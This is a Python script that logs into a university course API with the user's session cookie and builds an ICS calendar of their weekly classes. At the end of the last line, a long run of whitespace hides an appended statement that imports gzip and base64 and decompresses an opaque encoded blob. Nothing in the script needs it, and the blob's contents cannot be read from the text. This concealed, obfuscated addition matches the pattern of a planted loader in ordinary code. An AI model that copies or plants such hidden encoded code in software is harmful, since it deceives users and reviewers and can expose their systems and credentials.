import requests
import datetime, re
import sys


class ICSGEN(object):
    BASE_URL = "http://example.edu"
    HEADERS = {
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102'
    }
    ICS_WK = (None, 'MO', 'TU', 'WE', 'TH', 'FR', 'SA', 'SU')
    ICS_DATETIME_FORMAT = '%Y%m%dT%H%M%S'
    VALARM_TEMPLATE = '''BEGIN:VALARM
ACTION:DISPLAY
DESCRIPTION:Alarm for course.
TRIGGER:-P0DT0H{alarm_before_min}M0S
END:VALARM
'''
    VEVENT_TEMPLATE = '''BEGIN:VEVENT
DTSTART;TZID=UTC:{time_start}
DTEND;TZID=UTC:{time_end}
RRULE:FREQ=WEEKLY;WKST=SU;COUNT={count};BYDAY={day_in_week}
DESCRIPTION:
SUMMARY:{main_name}
{extra}
END:VEVENT
'''
    VCAL_TEMPLATE = '''BEGIN:VCALENDAR
VERSION:2.0
X-WR-CALNAME:{cal_name}
X-WR-TIMEZONE:UTC
BEGIN:VTIMEZONE
TZID:UTC
X-LIC-LOCATION:UTC
BEGIN:STANDARD
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
TZNAME:CST
DTSTART:19700101T000000
END:STANDARD
END:VTIMEZONE
{extra}
END:VCALENDAR
'''
    @staticmethod
    def deterime_semester(date_: datetime.date = None):
        if date_ is None:
            date_ = datetime.date.today()
        return date_.strftime('%Y%m')

    def __init__(
            self, 
            COOKIE_WEU: str =None, 
            date_in_first_week: str=None, 
            add_alarm=True, 
            alarm_before_min=20
        ):
        assert COOKIE_WEU is not None, "Cookie _WEU is required"
        self.add_alarm = add_alarm
        self.alarm_before_min = alarm_before_min

        assert date_in_first_week is not None, "You should specify your date in first week."
        week1_date = datetime.date.fromisoformat(date_in_first_week)
        self.semester = self.deterime_semester(week1_date)
        self.year, self.week_1, _ = week1_date.isocalendar()

        self.S = requests.Session()
        cookie_obj = requests.cookies.create_cookie(name='_WEU',value=COOKIE_WEU)
        self.S.cookies.set_cookie(cookie_obj)
        self.S.headers.update(self.HEADERS)

    def api_get_courses_results(self):
        try:
            resp = self.S.post(
                url = f"{self.BASE_URL}/gsapp/sys/modules/stuclasses.do",
                data = {
                    'semester': self.semester,
                    'idnum':'',
                },
                allow_redirects=False
            )
            if resp.status_code == 401:
                print(resp.text)
                sys.stderr.write('[!] 401 Forbidden. Check your _WEU cookie.\n')
                exit(1)
            
            resp = resp.json()
            assert resp['code'] != 0, f"stuclasses.do API returned non-zero code: {resp['code']}"
            return resp['datas']['stuclasses']['rows']
        except Exception as e:
            sys.stderr.write(str(e)+"\n")
            sys.stderr.write('[!] Fetch data failed. Network issue or API changed?\n')
            exit(1)
    
    def get_courses(self) -> dict:
        course_dict = {}
        cs = self.api_get_courses_results()
        for c in cs:
            cid = c['BJMC']
            if cid not in course_dict:
                course_dict[cid] = c
            latest = course_dict[cid]
            latest['starttime'] = min(latest['starttime'], c['starttime'])
            latest['endtime'] = max(latest['endtime'], c['endtime'])

        return course_dict

    def get_vevent_by_info(self, course):
        if self.add_alarm:
            ics_alarm = self.VALARM_TEMPLATE.format(
                alarm_before_min=self.alarm_before_min
            )
        else:
            ics_alarm = ''
        
        start_week, end_week = map(int,re.findall(r'(\d+)-(\d+)', course['week'])[0])
        week_count = end_week - start_week + 1
        course_first_date = datetime.date.fromisocalendar(self.year, self.week_1 + start_week - 1, course['term'])
        course_start_time = datetime.time(course['starttime']//100, course['starttime']%100)
        course_end_time = datetime.time(course['endtime']//100, course['endtime']%100)

        timeisc = lambda x,y : datetime.datetime.combine(x,y).strftime(self.ICS_DATETIME_FORMAT)
        ics_event = self.VEVENT_TEMPLATE.format(
            time_start = timeisc(course_first_date,course_start_time),
            time_end = timeisc(course_first_date,course_end_time),
            count = week_count,
            day_in_week = self.ICS_WK[course['term']],
            main_name = f"{course['name']}",
            extra = ics_alarm,
        )
        return ics_event
    
    def get_vcal_by_course_dict(self, course_dict):
        vevents = []
        for k in course_dict:
            course = course_dict[k]
            vevents.append(self.get_vevent_by_info(course))

        ics_cal = self.VCAL_TEMPLATE.format(
            cal_name = f"Courses of {self.semester}",
            extra = ''.join(vevents)
        )
        return ics_cal

    def get_ics_calendar(self):
        return self.get_vcal_by_course_dict(self.get_courses())
    
    def save_ics(self, fname=None):
        if fname is None:
            fname = f'Courses_of_{self.semester}.ics'
        with open(fname, 'w', encoding='utf-8') as fw:
            fw.write(self.get_ics_calendar())


if __name__ == "__main__":
    if sys.version_info<(3,8,0):
        sys.stderr.write("[!] You need python 3.8 or later to run this script.\n")
        exit(1)
    SESSIONID = input("[+] Please input following cookie of example.edu: _WEU=").strip()
    todayiso = datetime.date.today().isoformat()
    date_in_first_week = input(
        f"[+] Any date in first week of this semester, press Enter for today (eg. {todayiso}): "
    ).strip()

    if len(date_in_first_week) == 0:
        date_in_first_week = datetime.date.today().isoformat()
    print("[-] Loading...")
    C = ICSGEN(
        COOKIE_WEU = SESSIONID,
        date_in_first_week= date_in_first_week
    )
    C.save_ics()
    print('[+] Done! ICS file successfully generated.')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import gzip; import base64; gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='))

